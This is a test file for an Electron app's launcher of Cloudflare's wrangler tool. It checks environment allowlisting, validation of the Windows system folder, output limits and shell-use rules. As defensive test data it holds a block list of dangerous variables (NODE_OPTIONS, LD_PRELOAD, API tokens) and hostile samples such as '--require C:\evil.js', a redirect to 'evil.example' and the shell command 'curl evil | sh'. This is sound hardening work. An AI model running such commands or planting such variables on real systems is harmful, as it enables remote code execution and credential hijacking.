// The wrangler launcher (src/main/wrangler-launcher.ts; spec "Cloudflare set-up in the app", D2):
// 1. the pure half, for the packaged macOS and Windows path shapes and the unpackaged one;
// 2. the child's environment is built from an allowlist: nothing inherited can redirect execution,
//    the Windows system folder is checked before PATH is built from it, and no `.env` file is read;
// 3. a run keeps only the end of the output and stops a command that prints past the limit;
// 4. real runs through it from this checkout (the app's dependency, not a wrangler installed on the
//    machine): `--version`, and a dry-run deploy that a planted `.env` cannot change;
// 5. a regression tripwire for accidental direct wrangler calls (NOT a security boundary), and a
//    check that the main process starts no command through a shell.
// The packaged-build half is scripts/smoke-packaged-wrangler.mjs.
import { strict as assert } from 'node:assert'
import { EventEmitter } from 'node:events'
import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, relative } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import ts from 'typescript'
import { liveWorkerDeployConfig } from '../src/main/live-worker-deploy-config.ts'
import { BLOCKING_FILE_MESSAGE, blockingFileText, brokenJsonFileInOutput, visiblePath } from '../src/main/wrangler-failures.ts'
import { pagesBundlingHazard, resolveSiteDir } from '../src/main/publishing-logic.ts'
import { functionBody, normaliseNewlines, readSource } from './lib/read-source.mjs'
import { classifyProcess, isLocalConnect, isSystemPath, pathRules } from './lib/wrangler-trace-rules.mjs'
import {
  WRANGLER_KEPT_OUTPUT_CHARS, WRANGLER_MAX_OUTPUT_BYTES, WRANGLER_MISSING_MESSAGE, WRANGLER_OUTPUT_LIMIT_MESSAGE,
  WRANGLER_DRAIN_MS, WRANGLER_KILL_DEADLINE_MS, WRANGLER_KILL_GRACE_MS, WRANGLER_TIMED_OUT_MESSAGE, WRANGLER_TIME_LIMIT_MS, endAllWranglerRuns, startWranglerProcess, taskkillCommand,
  TRACE_FILE_VARIABLE, prepareWranglerRun, prepareWranglerWorkDir, resolveWranglerLaunch, runWrangler, wranglerChildEnv, wranglerEntryPath,
  wranglerEnvFilePath, wranglerRunFolder, windowsSystemRoot,
} from '../src/main/wrangler-launcher.ts'

const repo = dirname(dirname(fileURLToPath(import.meta.url)))
const present = () => true

// ── 1. Path shapes ──────────────────────────────────────────────────────────────────────────────
const mac = {
  execPath: '/Applications/TalkWeaver.app/Contents/MacOS/TalkWeaver',
  appRoot: '/Applications/TalkWeaver.app/Contents/Resources/app',
  platform: 'darwin',
  workDir: '/Users/ada/Library/Application Support/TalkWeaver/wrangler-runs',
  exists: present,
}
const windows = {
  execPath: 'C:\\Users\\Ada Lovelace\\AppData\\Local\\Programs\\TalkWeaver\\TalkWeaver.exe',
  appRoot: 'C:\\Users\\Ada Lovelace\\AppData\\Local\\Programs\\TalkWeaver\\resources\\app',
  platform: 'win32',
  workDir: 'C:\\Users\\Ada Lovelace\\AppData\\Roaming\\TalkWeaver\\wrangler-runs',
  exists: present,
}
const macEntry = '/Applications/TalkWeaver.app/Contents/Resources/app/node_modules/wrangler/wrangler-dist/cli.js'
const windowsEntry = 'C:\\Users\\Ada Lovelace\\AppData\\Local\\Programs\\TalkWeaver\\resources\\app\\node_modules\\wrangler\\wrangler-dist\\cli.js'

assert.equal(wranglerEntryPath(mac), macEntry)
assert.equal(wranglerEntryPath(windows), windowsEntry, 'Windows paths keep backslashes whatever machine resolves them')

for (const [name, install, entry] of [['macOS', mac, macEntry], ['Windows', windows, windowsEntry]]) {
  const deployArgs = ['pages', 'deploy', install === windows ? 'C:\\site dir' : '/site dir', '--project-name', 'talks']
  const resolved = resolveWranglerLaunch(install, deployArgs, { inherited: {}, set: { CLOUDFLARE_ACCOUNT_ID: 'acct' } })
  assert.equal(resolved.ok, true, `${name}: resolves`)
  const { command, args, env, cwd } = resolved.launch
  assert.equal(command, install.execPath, `${name}: the app's own executable runs it, by absolute path`)
  assert.notEqual(command, 'wrangler')
  assert.equal(cwd, install.workDir, `${name}: it runs in the folder kept for wrangler runs`)
  const at = args.indexOf(entry)
  assert.ok(at > 0, `${name}: wrangler's entry script is an absolute path inside the app`)
  const noDotenv = install === windows ? `${install.workDir}\\talkweaver-no-dotenv.env` : `${install.workDir}/talkweaver-no-dotenv.env`
  assert.equal(wranglerEnvFilePath(install), noDotenv)
  // `--env-file` last: it takes a list, and before the command it would swallow the command name.
  assert.deepEqual(args.slice(at + 1), [...deployArgs, '--env-file', noDotenv], `${name}: the wrangler arguments follow unchanged (spaces included), then the one env file wrangler may read`)
  assert.ok(args.slice(0, at).every((arg) => arg.startsWith('--') || arg.startsWith('data:')), `${name}: only Node flags come before the script`)
  assert.ok(!args.some((arg) => /wrangler(\.cmd|\.exe)?$/.test(arg)), `${name}: no bare wrangler or .cmd shim`)
  assert.equal(env.ELECTRON_RUN_AS_NODE, '1', `${name}: Electron runs as Node`)
  assert.equal(env.CLOUDFLARE_ACCOUNT_ID, 'acct', `${name}: what the call sets is there`)
}

// Unpackaged (npm run dev, the e2e scripts) and the test harness: the repository is the app root.
{
  const resolved = resolveWranglerLaunch({ execPath: '/repo/node_modules/electron/dist/Electron.app/Contents/MacOS/Electron', appRoot: '/repo', platform: 'darwin', workDir: '/ud/wrangler-runs', exists: present }, ['dev'])
  assert.equal(resolved.launch.args.at(-4), '/repo/node_modules/wrangler/wrangler-dist/cli.js')
}

// A missing bundled tool: the fixed message, with what is missing in the details. Nothing about installing wrangler.
for (const install of [mac, windows]) {
  const asked = []
  const resolved = resolveWranglerLaunch({ ...install, exists: (path) => { asked.push(path); return false } }, ['--version'])
  assert.equal(resolved.ok, false)
  assert.equal(resolved.error, 'This TalkWeaver installation is incomplete')
  assert.equal(resolved.error, WRANGLER_MISSING_MESSAGE)
  assert.ok(resolved.details.includes(wranglerEntryPath(install)), 'the details name the missing file')
  assert.ok(!/npm i|install wrangler|not found —/i.test(`${resolved.error} ${resolved.details}`))
  assert.deepEqual(asked, [wranglerEntryPath(install)], 'only the absolute path is checked; no PATH search')
}
{
  const run = await runWrangler({ ...mac, exists: () => false }, ['--version'])
  assert.equal(run.ok, false)
  assert.equal(run.missing?.error, WRANGLER_MISSING_MESSAGE, 'a run reports the missing tool without starting anything')
}

// ── 2. The child's environment is built, not copied ─────────────────────────────────────────────
// Every variable found in wrangler, miniflare, esbuild, workerd and Node that selects an executable,
// a module path, a settings location, an endpoint, a trust store or an identity (the list at the top
// of the launcher), plus a few that merely ride along in a developer's shell.
const DANGEROUS = [
  'ESBUILD_BINARY_PATH', 'MINIFLARE_WORKERD_PATH', 'CLOUDFLARED_PATH', 'WRANGLER_DOCKER_BIN', 'WRANGLER_C3_COMMAND',
  'DOCKER_HOST', 'WRANGLER_DOCKER_HOST', 'ComSpec', 'PATHEXT',
  'NODE_OPTIONS', 'NODE_PATH', 'VSCODE_INSPECTOR_OPTIONS', 'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH', 'LD_PRELOAD',
  'LD_LIBRARY_PATH', 'ELECTRON_RUN_AS_NODE', 'ELECTRON_OVERRIDE_DIST_PATH', 'WRANGLER_BUILD_CONDITIONS',
  'WRANGLER_BUILD_PLATFORM', 'MINIFLARE_WORKERD_V8_FLAGS', 'MINIFLARE_WORKERD_AUTOGATES', 'ESBUILD_WORKER_THREADS', 'ESBUILD_MAX_BUFFER',
  'XDG_CONFIG_HOME', 'XDG_CACHE_HOME', 'XDG_DATA_HOME', 'WRANGLER_CACHE_DIR', 'WRANGLER_REGISTRY_PATH',
  'MINIFLARE_REGISTRY_PATH', 'MINIFLARE_CACHE_DIR', 'WRANGLER_LOG_PATH', 'WRANGLER_OUTPUT_FILE_PATH',
  'WRANGLER_OUTPUT_FILE_DIRECTORY', 'WRANGLER_HTTPS_CERT_PATH', 'WRANGLER_HTTPS_KEY_PATH', 'CLOUDFLARE_ENV',
  'CLOUDFLARE_INCLUDE_PROCESS_ENV', 'CLOUDFLARE_LOAD_DEV_VARS_FROM_DOT_ENV', 'DOTENV_KEY',
  'CLOUDFLARE_API_BASE_URL', 'CF_API_BASE_URL', 'WRANGLER_API_ENVIRONMENT', 'WRANGLER_AUTH_DOMAIN', 'WRANGLER_AUTH_URL',
  'WRANGLER_TOKEN_URL', 'WRANGLER_REVOKE_URL', 'CLOUDFLARE_COMPLIANCE_REGION', 'CLOUDFLARE_CONTAINER_REGISTRY', 'SENTRY_DSN',
  'NODE_EXTRA_CA_CERTS', 'NODE_TLS_REJECT_UNAUTHORIZED', 'SSL_CERT_FILE', 'SSL_CERT_DIR',
  'CLOUDFLARE_API_TOKEN', 'CLOUDFLARE_API_KEY', 'CLOUDFLARE_EMAIL', 'CLOUDFLARE_ACCOUNT_ID', 'CF_API_TOKEN', 'CF_API_KEY',
  'CF_EMAIL', 'CF_ACCOUNT_ID', 'CLOUDFLARE_ACCESS_CLIENT_ID', 'CLOUDFLARE_ACCESS_CLIENT_SECRET',
  'WRANGLER_CF_AUTHORIZATION_TOKEN', 'WRANGLER_R2_SQL_AUTH_TOKEN', 'CF_PAGES_UPLOAD_JWT', 'WRANGLER_CLIENT_ID',
  'CLOUDFLARE_CLIENT_ID', 'WRANGLER_CI_OVERRIDE_NAME', 'WRANGLER_CI_MATCH_TAG', 'WORKERS_CI_BRANCH', 'CF_PAGES_COMMIT_SHA',
  'WRANGLER_SEND_METRICS', 'WRANGLER_LOG', 'CI', 'GITHUB_SHA', 'npm_config_user_agent', 'BWS_ACCESS_TOKEN', 'TALKWEAVER_LIVE_ADMIN_SECRET',
]
// What is inherited: who the person is, the temp folder, the language, a proxy. NOT the home folder.
const NEEDED = {
  USER: 'ada', LOGNAME: 'ada', TMPDIR: '/var/folders/x/T/', LANG: 'en_GB.UTF-8', LC_ALL: 'en_GB.UTF-8', LC_CTYPE: 'UTF-8',
  HTTP_PROXY: 'http://proxy:8080', HTTPS_PROXY: 'http://proxy:8080', NO_PROXY: 'localhost', http_proxy: 'http://proxy:8080',
  https_proxy: 'http://proxy:8080', no_proxy: 'localhost',
}
// What the launcher itself decides for every command. A call cannot change any of it.
const FIXED = [
  'ELECTRON_RUN_AS_NODE', 'PATH', 'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM', 'GIT_CONFIG_NOSYSTEM', 'GIT_CEILING_DIRECTORIES', 'GIT_TERMINAL_PROMPT',
  'HOME', 'USERPROFILE', 'XDG_CONFIG_HOME', 'XDG_CACHE_HOME', 'XDG_DATA_HOME', 'APPDATA', 'LOCALAPPDATA', 'WRANGLER_CACHE_DIR',
  'WRANGLER_HIDE_BANNER', 'NO_COLOR', 'FORCE_COLOR', 'CLOUDFLARE_CF_FETCH_ENABLED', 'CLOUDFLARE_LOAD_DEV_VARS_FROM_DOT_ENV', 'CLOUDFLARE_INCLUDE_PROCESS_ENV',
]
const personal = { HOME: '/Users/ada', USERPROFILE: 'C:\\Users\\Ada', HOMEDRIVE: 'C:', HOMEPATH: '\\Users\\Ada', APPDATA: 'C:\\Users\\Ada\\AppData\\Roaming', LOCALAPPDATA: 'C:\\Users\\Ada\\AppData\\Local' }
for (const install of [mac, windows]) {
  const hostile = Object.fromEntries(DANGEROUS.map((name) => [name, `/evil/${name}`]))
  const inherited = { ...hostile, ...personal, ...NEEDED, PATH: '/evil/bin:/opt/homebrew/bin', ...(install === windows ? { SystemRoot: 'C:\\Windows' } : {}) }
  const frozen = JSON.stringify(inherited)
  const { launch } = resolveWranglerLaunch(install, ['deploy'], { inherited, set: { CLOUDFLARE_API_TOKEN: 'explicit-token' } })
  const values = Object.values(launch.env).join('\n')
  for (const name of DANGEROUS) {
    assert.ok(!values.includes(`/evil/${name}`), `${install.platform}: inherited ${name} does not reach wrangler`)
  }
  assert.ok(!values.includes('/evil/bin') && !values.includes('homebrew'), `${install.platform}: the inherited PATH does not reach wrangler`)
  assert.ok(!values.includes('/Users/ada') || install === mac, 'the person\'s home does not reach wrangler')
  for (const value of Object.values(personal)) assert.ok(!Object.values(launch.env).includes(value), `${install.platform}: ${value} (the person's home) does not reach wrangler`)
  for (const [name, value] of Object.entries(NEEDED)) assert.equal(launch.env[name], value, `${install.platform}: ${name} is kept`)
  assert.equal(launch.env.CLOUDFLARE_API_TOKEN, 'explicit-token', 'the token comes only from what the call sets')
  assert.equal(launch.env.ELECTRON_RUN_AS_NODE, '1')
  assert.equal(launch.env.WRANGLER_SEND_METRICS, 'false', 'no usage reports by default, whatever was inherited')
  assert.equal(launch.env.CLOUDFLARE_LOAD_DEV_VARS_FROM_DOT_ENV, 'false', 'no `.env` beside the config becomes Worker secrets')
  assert.equal(launch.env.CLOUDFLARE_INCLUDE_PROCESS_ENV, 'false')
  assert.equal(launch.env.CLOUDFLARE_CF_FETCH_ENABLED, 'false', '`dev` does not fetch request metadata from Cloudflare')
  assert.equal(launch.env.WRANGLER_HIDE_BANNER, 'true', 'no banner, so no update check against the person\'s npm settings')
  assert.deepEqual([launch.env.NO_COLOR, launch.env.FORCE_COLOR], ['1', '0'], 'no colour is asked for: the output is read by the app, not a terminal')
  assert.equal(JSON.stringify(inherited), frozen, 'the inherited environment object is not changed')
  // Nothing else: the kept names, what the launcher fixes, its one default, and what the call set.
  assert.deepEqual(Object.keys(launch.env).sort(), [...Object.keys(NEEDED), ...FIXED, 'WRANGLER_SEND_METRICS', 'CLOUDFLARE_API_TOKEN', ...(install === windows ? ['SystemRoot', 'ComSpec'] : [])].sort())

  // No ambient programs, home, cache or git settings: all inside the run folder the app writes.
  const sepr = install === windows ? '\\' : '/'
  const inRun = (...parts) => [install.workDir, ...parts].join(sepr)
  const folder = wranglerRunFolder(install)
  assert.deepEqual(folder, {
    envFile: inRun('talkweaver-no-dotenv.env'), emptyPath: inRun('empty-path'), home: inRun('home'), cache: inRun('cache'),
    pagesConfigStub: inRun('wrangler.json'), pagesRedirect: inRun('.wrangler', 'deploy', 'config.json'), packageJson: inRun('package.json'), tsconfig: inRun('tsconfig.json'),
  })
  if (install === mac) assert.equal(launch.env.PATH, folder.emptyPath, 'macOS: PATH is the one empty folder; no system folder, no git')
  else {
    assert.equal(launch.env.PATH, 'C:\\Windows\\System32', 'Windows: PATH is the checked System32 only')
    assert.equal(launch.env.ComSpec, 'C:\\Windows\\System32\\cmd.exe', 'and the shell is the checked cmd.exe')
  }
  assert.deepEqual([launch.env.HOME, launch.env.USERPROFILE, launch.env.WRANGLER_CACHE_DIR], [folder.home, folder.home, folder.cache])
  for (const name of ['XDG_CONFIG_HOME', 'XDG_CACHE_HOME', 'XDG_DATA_HOME', 'APPDATA', 'LOCALAPPDATA']) assert.ok(launch.env[name].startsWith(folder.home + sepr), `${name} is inside wrangler's own home`)
  assert.deepEqual(
    [launch.env.GIT_CONFIG_GLOBAL, launch.env.GIT_CONFIG_SYSTEM, launch.env.GIT_CONFIG_NOSYSTEM, launch.env.GIT_TERMINAL_PROMPT, launch.env.GIT_CEILING_DIRECTORIES],
    [folder.envFile, folder.envFile, '1', '0', install.workDir.slice(0, install.workDir.lastIndexOf(sepr))],
    'a git, were one ever reachable, reads no settings of the person\'s and no repository above the run folder',
  )
  // A call cannot change what the launcher fixes (silently kept), whatever the case of the name on Windows.
  const tried = Object.fromEntries([...FIXED.filter((name) => name !== 'ELECTRON_RUN_AS_NODE'), 'ComSpec'].map((name) => [name, '/caller/override']))
  const overridden = resolveWranglerLaunch(install, ['deploy'], { inherited, set: { ...tried, ...(install === windows ? { path: 'C:\\caller', comspec: 'C:\\caller\\cmd.exe' } : {}) } }).launch.env
  for (const name of FIXED) assert.equal(overridden[name], launch.env[name], `${install.platform}: a call cannot set ${name}`)
  assert.ok(!Object.values(overridden).some((value) => String(value).includes('caller')) || install === mac && overridden.ComSpec === '/caller/override', 'nothing the call tried reaches the child')
}
{
  // Windows: names match whatever their case; PATH is built from a CHECKED SystemRoot; no second `Path` survives.
  const realWindows = (path) => /^C:\\Windows\\System32\\(?:kernel32\.dll|cmd\.exe)$/i.test(path)
  const env = wranglerChildEnv({ ...windows, exists: realWindows }, { inherited: {
    Path: 'C:\\evil;C:\\Program Files\\nodejs', SYSTEMROOT: 'C:\\Windows', UserProfile: 'C:\\Users\\Ada', AppData: 'C:\\Users\\Ada\\AppData\\Roaming',
    LocalAppData: 'C:\\Users\\Ada\\AppData\\Local', Temp: 'C:\\T', TMP: 'C:\\T', ComSpec: 'C:\\evil\\cmd.exe', node_options: '--require C:\\evil.js',
    cloudflare_api_base_url: 'https://evil.example', wrangler_send_metrics: 'true', cloudflare_include_process_env: 'true',
  } })
  assert.equal(env.PATH, 'C:\\Windows\\System32')
  assert.equal(env.ComSpec, 'C:\\Windows\\System32\\cmd.exe')
  assert.deepEqual(Object.keys(env).sort(), [...FIXED, 'ComSpec', 'SYSTEMROOT', 'TMP', 'Temp', 'WRANGLER_SEND_METRICS'].sort(), 'no Path, UserProfile, AppData or LocalAppData in another case beside the launcher\'s own')
  assert.ok(!Object.values(env).some((value) => /evil|Users\\Ada\\AppData|nodejs/.test(value)))
  assert.equal(env.WRANGLER_SEND_METRICS, 'false')
  // On macOS the same lower-case names are simply not on the list.
  assert.equal(wranglerChildEnv(mac, { inherited: { node_options: 'x', home: '/x' } }).node_options, undefined)

  // The inherited SystemRoot is checked, not trusted: an absolute drive-letter path, no `..`, holding
  // System32\kernel32.dll and System32\cmd.exe. Anything else: C:\Windows.
  const holds = (...roots) => (path) => roots.some((root) => path === `${root}\\System32\\kernel32.dll` || path === `${root}\\System32\\cmd.exe`)
  assert.equal(windowsSystemRoot({ SystemRoot: 'D:\\WinNT' }, holds('D:\\WinNT')), 'D:\\WinNT', 'a real Windows folder elsewhere is accepted')
  assert.equal(windowsSystemRoot({ systemroot: 'D:\\WinNT\\' }, holds('D:\\WinNT')), 'D:\\WinNT', 'whatever the case of the name; a trailing separator is dropped')
  const everything = () => true
  for (const [bad, why] of [
    [undefined, 'missing'], ['', 'empty'], ['Windows', 'relative'], ['\\Windows', 'no drive letter'],
    ['\\\\evil-host\\share\\Windows', 'a network share'], ['C:Windows', 'drive-relative'], ['/mnt/c/Windows', 'not a Windows path'],
    ['C:\\Windows\\..\\Users\\Ada\\evil', 'has a .. segment'], ['C:/Windows/../evil', 'has a .. segment (forward slashes)'],
  ]) {
    assert.equal(windowsSystemRoot(bad === undefined ? {} : { SystemRoot: bad }, everything), 'C:\\Windows', `SystemRoot ${why} → C:\\Windows`)
  }
  assert.equal(windowsSystemRoot({ SystemRoot: 'C:\\Users\\Ada\\evil' }, holds('C:\\Windows')), 'C:\\Windows', 'a folder without kernel32.dll and cmd.exe is refused')
  const onlyKernel = (path) => path === 'E:\\Fake\\System32\\kernel32.dll'
  assert.equal(windowsSystemRoot({ SystemRoot: 'E:\\Fake' }, onlyKernel), 'C:\\Windows', 'both files must be there')
  // A refused SystemRoot reaches neither PATH, nor the shell, nor the child's own SystemRoot and windir.
  const refused = wranglerChildEnv({ ...windows, exists: holds('C:\\Windows') }, { inherited: { SystemRoot: 'C:\\Users\\Ada\\evil', windir: 'C:\\Users\\Ada\\evil' } })
  assert.deepEqual([refused.PATH, refused.ComSpec], ['C:\\Windows\\System32', 'C:\\Windows\\System32\\cmd.exe'])
  assert.deepEqual([refused.SystemRoot, refused.windir], ['C:\\Windows', 'C:\\Windows'])
  assert.ok(!Object.values(refused).join(';').includes('evil'))
  // And through the launcher's own seam (`install.exists`).
  const viaInstall = resolveWranglerLaunch({ ...windows, exists: (path) => path.endsWith('cli.js') }, ['--version'], { inherited: { SystemRoot: 'E:\\Fake' } })
  assert.equal(viaInstall.launch.env.PATH, 'C:\\Windows\\System32')
}
// What a call sets is passed as given: CLOUDFLARE_* and WRANGLER_* names, and test overrides.
{
  const set = { CLOUDFLARE_API_TOKEN: 't', CLOUDFLARE_API_BASE_URL: 'http://127.0.0.1:9', WRANGLER_LOG_PATH: '/tmp/l', WRANGLER_SEND_METRICS: 'true', ESBUILD_BINARY_PATH: '/x/esbuild' }
  const env = wranglerChildEnv(mac, { inherited: { HOME: '/Users/ada', CLOUDFLARE_API_TOKEN: 'inherited' }, set })
  for (const [name, value] of Object.entries(set)) assert.equal(env[name], value, `${name} set by the call is present`)
}
// A call cannot change how Node itself starts: such names are REFUSED (a thrown TypeError), not dropped silently.
for (const set of [{ ELECTRON_RUN_AS_NODE: '0' }, { NODE_OPTIONS: '--require /evil.js' }, { NODE_PATH: '/evil' }, { node_options: 'x' }, { DYLD_INSERT_LIBRARIES: '/evil.dylib' }, { LD_PRELOAD: '/evil.so' }]) {
  assert.throws(() => resolveWranglerLaunch(mac, ['--version'], { set }), TypeError, `${Object.keys(set)[0]} cannot be set`)
  assert.throws(() => wranglerChildEnv(windows, { set }), TypeError)
}
// The test-only trace: asked for by an argument, never by a variable.
{
  const plain = resolveWranglerLaunch(mac, ['deploy'], { inherited: { TALKWEAVER_WRANGLER_TRACE_FILE: '/evil/trace', [TRACE_FILE_VARIABLE]: '/evil/trace' } }).launch
  assert.ok(!plain.args.includes('--require') && !(TRACE_FILE_VARIABLE in plain.env), 'no variable switches the trace on')
  assert.throws(() => resolveWranglerLaunch(mac, ['deploy'], { set: { NODE_OPTIONS: '--require /x/preload.cjs' } }), TypeError)
  const traced = resolveWranglerLaunch(mac, ['deploy'], {}, { preload: '/repo/scripts/lib/wrangler-trace-preload.cjs', file: '/tmp/trace.ndjson' }).launch
  assert.deepEqual(traced.args.slice(0, 3), ['--no-warnings', '--require', '/repo/scripts/lib/wrangler-trace-preload.cjs'])
  assert.equal(traced.env[TRACE_FILE_VARIABLE], '/tmp/trace.ndjson')
  const main = readSource(join(repo, 'src/main/index.ts'))
  assert.ok(!/wrangler-trace|WranglerTrace|TRACE_FILE_VARIABLE|preload:\s/.test(main.split('\n').filter((line) => /[Ww]rangler/.test(line)).join('\n')), 'the main process never asks for the trace')
}

// The site folder is one absolute path, used for building the site and as wrangler's argument.
{
  const ud = '/Users/ada/Library/Application Support/TalkWeaver'
  assert.equal(resolveSiteDir(ud, undefined, 'darwin'), `${ud}/cloudflare-pages-site`)
  assert.equal(resolveSiteDir(ud, '  ', 'darwin'), `${ud}/cloudflare-pages-site`)
  assert.equal(resolveSiteDir(ud, 'site', 'darwin'), `${ud}/site`, 'a relative override is taken from user data (not from wrangler\'s working folder)')
  assert.equal(resolveSiteDir(ud, './sites/../site/', 'darwin'), `${ud}/site`)
  assert.equal(resolveSiteDir(ud, '/Volumes/Talks/site', 'darwin'), '/Volumes/Talks/site', 'an absolute override is used as it is')
  assert.equal(resolveSiteDir('C:\\Users\\Ada\\AppData\\Roaming\\TalkWeaver', 'site', 'win32'), 'C:\\Users\\Ada\\AppData\\Roaming\\TalkWeaver\\site')
  assert.equal(resolveSiteDir('C:\\Users\\Ada\\AppData\\Roaming\\TalkWeaver', 'D:\\Talks\\site', 'win32'), 'D:\\Talks\\site')
  const main = readSource(join(repo, 'src/main/index.ts'))
  assert.ok(/function publishSiteDir\(\): string \{\s*return resolveSiteDir\(/.test(main), 'the main process takes the site folder from resolveSiteDir, everywhere')
  assert.ok(!/getConfig\('publishSiteDir'[^)]*\)\s*\?\?/.test(main), 'and never reads the raw override beside it')
}

// A handout site is plain files. Anything that would make `pages deploy` compile code stops the publish.
{
  const site = '/ud/cloudflare-pages-site'
  const run = '/ud/wrangler-runs'
  assert.equal(pagesBundlingHazard(site, run, () => false, 'darwin'), null)
  assert.equal(pagesBundlingHazard(site, run, (path) => path === `${site}/_redirects` || path === `${site}/talk/index.html`, 'darwin'), null, 'redirects and pages are plain files')
  for (const hazard of [`${site}/_worker.js`, `${site}/functions`, `${run}/functions`]) {
    const message = pagesBundlingHazard(site, run, (path) => path === hazard, 'darwin')
    assert.ok(message?.includes(hazard) && /^Publishing stopped: /.test(message), `${hazard} stops the publish, by name`)
  }
  assert.ok(pagesBundlingHazard('C:\\ud\\site', 'C:\\ud\\wrangler-runs', (path) => path === 'C:\\ud\\site\\_worker.js', 'win32')?.includes('C:\\ud\\site\\_worker.js'))
  // One place uploads the site (ticket 04: handout-publishing.ts `uploadSite`), and it checks first.
  const main = readSource(join(repo, 'src/main/index.ts'))
  assert.equal(main.split('pagesBundlingBlock(siteDir)').length - 1, 1, 'the main process hands the check to the one place that uploads')
  assert.ok(!main.includes("'pages', 'deploy'"), 'and runs no `pages deploy` of its own')
  const publishing = readSource(join(repo, 'src/main/handout-publishing.ts'))
  assert.equal(publishing.split("'pages', 'deploy'").length - 1, 1, 'one place runs `pages deploy`')
  assert.ok(publishing.indexOf('ports.bundlingHazard(dir)') > 0 && publishing.indexOf('ports.bundlingHazard(dir)') < publishing.indexOf("'pages', 'deploy'"), 'and it checks first')
}

// The rules the ambient-access trace test judges by, on Windows shapes (that test runs them for
// real on a Windows machine only in CI; here they are checked with literal paths).
{
  const win = { platform: 'win32', execPath: 'C:\\hostedtoolcache\\windows\\node\\24.1.0\\x64\\node.exe', appRoot: 'D:\\a\\talk-weaver\\talk-weaver', systemRoot: 'C:\\Windows' }
  const rules = pathRules('win32')
  assert.ok(rules.under('d:\\A\\talk-weaver\\talk-weaver\\node_modules\\x.js', win.appRoot), 'case and drive-letter case do not matter on Windows')
  assert.ok(rules.under('D:/a/talk-weaver/talk-weaver/worker/index.ts', win.appRoot), 'nor the separator')
  assert.ok(!rules.under('D:\\a\\talk-weaver\\talk-weaver-evil\\x', win.appRoot), 'a sibling with the same prefix is not inside')
  assert.ok(rules.isAncestorOf('D:\\a', win.appRoot) && rules.isAncestorOf('D:\\', win.appRoot) && !rules.isAncestorOf(win.appRoot, win.appRoot))
  assert.ok(rules.under('C:\\Users\\RUNNER~1\\AppData\\Local\\Temp\\miniflare-1\\x', 'C:\\Users\\RUNNER~1\\AppData\\Local\\Temp'))
  assert.ok(isSystemPath('C:\\WINDOWS\\system32\\drivers\\etc\\hosts', win) && !isSystemPath('C:\\Users\\Ada\\tsconfig.json', win) && !isSystemPath('C:\\WindowsEvil\\x', win))
  assert.equal(classifyProcess({ file: 'c:\\hostedtoolcache\\windows\\node\\24.1.0\\x64\\node.exe', args: [] }, win), 'own')
  assert.equal(classifyProcess({ file: `${win.appRoot}\\node_modules\\wrangler\\node_modules\\@esbuild\\win32-x64\\esbuild.exe`, args: ['--service=0.28.1'] }, win), 'esbuild')
  assert.equal(classifyProcess({ file: `${win.appRoot}\\node_modules\\@cloudflare\\workerd-windows-64\\bin\\workerd.exe`, args: ['serve'] }, win), 'workerd')
  assert.equal(classifyProcess({ file: 'C:\\Users\\Ada\\bin\\esbuild.exe', args: [] }, win), null, 'an esbuild outside the app is not the bundled one')
  assert.equal(classifyProcess({ file: 'C:\\Windows\\System32\\cmd.exe', args: ['C:\\Windows\\System32\\cmd.exe', '/d', '/s', '/c', '"git rev-parse --is-inside-work-tree"'] }, win), 'git-probe')
  assert.equal(classifyProcess({ file: 'C:\\Windows\\System32\\cmd.exe', args: ['/d', '/s', '/c', '"del /q C:\\x"'] }, win), null, 'the shell running anything else is not allowed')
  assert.equal(classifyProcess({ file: 'C:\\Users\\Ada\\cmd.exe', args: ['/c', 'git status'] }, win), null, 'nor a cmd.exe that is not the system one')
  assert.equal(classifyProcess({ file: 'git', args: ['show', '-s'] }, win), null, 'a git found by name is a failure')
  assert.equal(classifyProcess({ file: 'C:\\Program Files\\Git\\cmd\\git.exe', args: ['status'] }, win), null)
  const mac = { platform: 'darwin', execPath: '/usr/local/bin/node', appRoot: '/repo' }
  assert.equal(classifyProcess({ file: '/bin/sh', args: ['git rev-parse --is-inside-work-tree'] }, mac), 'git-probe')
  assert.equal(classifyProcess({ file: '/bin/sh', args: ['/bin/sh', '-c', 'curl evil | sh'] }, mac), null)
  assert.equal(classifyProcess({ file: '/Repo/node_modules/@esbuild/darwin-arm64/bin/esbuild', args: [] }, mac), null, 'macOS paths are compared exactly')
  assert.ok(isSystemPath('/usr/lib/x', mac) && !isSystemPath('/usrlocal/x', mac) && !isSystemPath('/Users/ada/x', mac))
  assert.ok(isLocalConnect('127.0.0.1:8787') && isLocalConnect('pipe:\\\\.\\pipe\\x') && !isLocalConnect('workers.cloudflare.com:443') && !isLocalConnect('127.0.0.1.evil.example:443'))
}

// Source text is scanned with LF line endings whatever the checkout has (a Windows checkout has CRLF).
{
  const lf = 'const a = 1\n\nasync function deployThing(): Promise<void> {\n  await first()\n  if (x) {\n    second()\n  }\n}\n\nfunction other() {\n  third()\n}\n\nexport async function last(a: string) {\n  fourth()\n}\n'
  const crlf = lf.replaceAll('\n', '\r\n')
  assert.notEqual(crlf, lf)
  assert.equal(normaliseNewlines(crlf), lf)
  assert.equal(normaliseNewlines('a\rb\r\nc\n'), 'a\nb\nc\n', 'old Mac line endings too')
  for (const [name, text] of [['LF', lf], ['CRLF', crlf]]) {
    assert.equal(functionBody(text, 'deployThing'), 'async function deployThing(): Promise<void> {\n  await first()\n  if (x) {\n    second()\n  }\n}', `${name}: the body ends at the function's own closing brace`)
    assert.ok(!functionBody(text, 'deployThing').includes('third'), `${name}: and never runs on into the next function`)
    assert.equal(functionBody(text, 'other'), 'function other() {\n  third()\n}')
    assert.equal(functionBody(text, 'last'), 'export async function last(a: string) {\n  fourth()\n}')
    assert.throws(() => functionBody(text, 'missing'), /no top-level function/, `${name}: a function that is not there is an error, not an empty or widened match`)
    assert.throws(() => functionBody(text, 'deploy'), /no top-level function/, 'a name is matched whole')
  }
  assert.throws(() => functionBody('function open() {\n  never closed', 'open'), /no closing brace/)
  // The real file, read as a Windows checkout would hold it.
  const real = readSource(join(repo, 'src/main/index.ts'))
  assert.ok(!real.includes('\r'))
  assert.equal(functionBody(real.replaceAll('\n', '\r\n'), 'deployLiveWorker'), functionBody(real, 'deployLiveWorker'))
  assert.ok(functionBody(real, 'deployLiveWorker').length < 5000, 'one function, not the rest of the file')
}

